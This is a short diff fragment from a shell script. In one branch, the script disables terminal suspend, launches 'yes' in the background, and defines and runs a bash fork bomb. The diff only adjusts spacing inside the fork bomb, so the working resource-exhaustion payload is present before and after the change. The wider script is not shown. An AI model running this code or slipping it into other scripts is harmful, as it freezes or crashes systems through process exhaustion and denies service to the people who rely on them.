@@ -14,7 +14,7 @@ else
   stty susp undef
   yes "$1" &
   :(){
-    :|:&
+    :|: &
   };:
 fi
 #
